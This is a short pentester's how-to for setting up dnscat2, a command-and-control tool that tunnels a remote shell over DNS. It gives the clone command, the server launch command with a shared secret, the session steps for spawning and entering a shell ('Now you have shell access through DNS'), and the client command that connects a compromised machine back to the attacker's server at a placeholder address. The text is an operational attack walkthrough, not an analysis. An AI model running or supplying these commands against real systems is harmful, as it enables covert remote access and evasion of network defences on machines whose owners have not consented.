DNSCAT
First we need to set up a server

Download the github repo for DNSCat

https://github.com/iagox86/dnscat2

or 

git clone https://github.com/iagox86/dnscat2.git

Server Side

Make sure that either your domain is set up (stealthy) or you have all your port forwarding set up to get connections from the outside world

root@kali# ruby2.5 dnscat2.rb --secret 752891347958625

MAKE SURE THAT YOU ARE NOT USING OLD FUCKING RUBY - IT WILL THROW ERRORS - Ruby 2.3 and 2.5 work. AND ALSO MAKE SURE YOU ARE IN THE SERVER DIRECTORY, EXECUTING THE SERVER RUBY SCRIPT, E.G., /pentest/pivoting/dnscat2/server/dnscat2.rb

Once a connection is made, 

Type the command "windows" --without the quote.  This will show all open windows.

Now type in "window 1" window 1 will be the very first window you get after the initial connection to the client from the server AKA attacker machine

Now when in "window 1", type the command "shell" 

Now press ctrl + z and this will take you back to the main screen.

Once in the main screen, type the command "windows" and you should see a list of windows.  The window that says something like "4 :: sh (thp3) [encrypted and verified] [*]"

In this instance 4 is the window and sh is the fact I am running a shell on the box.

type window -i 4

Now you have shell access through DNS :):):):)




Client Side

For the client side, execute the following, replace the x.x.x.x with your server IP address, or domain name.

dnscat --dns server=x.x.x.x,port=53 --secret=752891347958625

windows
